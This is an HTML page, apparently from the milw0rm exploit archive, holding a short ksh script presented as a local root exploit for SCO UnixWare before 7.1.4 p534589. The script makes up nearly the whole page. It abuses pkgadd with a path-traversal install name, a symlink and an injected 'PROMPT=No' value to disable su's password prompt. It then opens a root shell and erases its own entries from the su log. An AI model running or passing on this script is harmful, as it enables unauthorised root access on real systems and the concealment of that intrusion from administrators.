<html><head><title>SCO UnixWare < 7.1.4 p534589 (pkgadd) Local Root Exploit</title></head><pre>#!/bin/ksh
#
# 04/2008: public release
# SCO UnixWare &lt; 7.1.4 p534589
#
if [ `id -un` = 'root' ]; then
	grep -v &quot; $1-root\$&quot; /var/adm/sulog &gt;su.log
	cp su.def /etc/default/su
	cp su.log /var/adm/sulog
	rm -f su.def su.log woot.log
else
	echo &quot;------------------------------------&quot;
	echo &quot; UnixWare pkgadd Local Root Exploit&quot;
	echo &quot; By qaaz&quot;
	echo &quot;------------------------------------&quot;
	EVIL=`echo 'XX\nPROMPT=No\nXX'`
	cp /etc/default/su su.def
	ln -s /etc/default/su woot.log
	PKGINST=../../../..`pwd`/woot /usr/sbin/pkgadd &quot;$EVIL&quot; 1&gt;/dev/null 2&gt;&amp;1
	su root -c &quot;$0 `id -un`; /bin/sh -i&quot;
fi

# milw0rm.com [2008-04-04]</pre></html>